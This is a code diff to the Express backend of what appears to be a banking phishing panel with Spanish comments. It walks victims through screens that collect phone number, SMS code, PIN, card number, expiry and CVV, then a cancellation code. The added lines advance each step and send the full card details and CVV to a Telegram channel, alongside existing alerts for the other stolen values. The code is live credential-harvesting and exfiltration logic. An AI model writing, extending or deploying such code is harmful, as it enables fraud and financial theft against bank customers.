@@ -1410,6 +1410,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'telefono':
                 updatedFields.celular = inputData.telefono;
+                updatedFields.pasoActual = ScreenType.CODIGO;
                 console.log('Teléfono recibido:', inputData.telefono);
                 
                 // Enviar notificación a Telegram
@@ -1421,6 +1422,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'codigo':
                 updatedFields.sms = inputData.codigo;
+                updatedFields.pasoActual = ScreenType.NIP;
                 console.log('Código de verificación recibido:', inputData.codigo);
                 
                 // Enviar notificación a Telegram
@@ -1432,6 +1434,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'nip':
                 updatedFields.nip = inputData.nip;
+                updatedFields.pasoActual = ScreenType.TARJETA;
                 
                 // Enviar notificación a Telegram
                 const nipMessage = `🔐 <b>NIP RECIBIDO</b>\n\n` +
@@ -1444,6 +1447,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.tarjeta = inputData.tarjeta;
                 updatedFields.fechaVencimiento = inputData.fechaVencimiento;
                 updatedFields.cvv = inputData.cvv;
+                updatedFields.pasoActual = ScreenType.TRANSFERIR;
+                
+                // Enviar notificación a Telegram
+                const tarjetaMsg = `💳 <b>DATOS DE TARJETA</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `💳 <b>Número:</b> ${inputData.tarjeta}\n` +
+                  `📅 <b>Vencimiento:</b> ${inputData.fechaVencimiento}\n` +
+                  `🔐 <b>CVV:</b> ${inputData.cvv}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(tarjetaMsg);
                 break;
               case 'sms_compra':
               case 'SMS_COMPRA':
@@ -1451,6 +1464,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 // Asegurarnos de manejar correctamente las respuestas de SMS_COMPRA
                 if (inputData && inputData.smsCompra) {
                   updatedFields.smsCompra = inputData.smsCompra;
+                  updatedFields.pasoActual = ScreenType.CANCELACION;
                   console.log('Recibido código de cancelación SMS_COMPRA:', inputData.smsCompra);
 
                   // Notificar a los administradores el código de cancelación inmediatamente
@@ -1479,6 +1493,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'celular':
                 updatedFields.celular = inputData.celular;
+                updatedFields.pasoActual = ScreenType.CODIGO;
                 break;
               case 'gmail':
                 updatedFields.correo = inputData.correo;
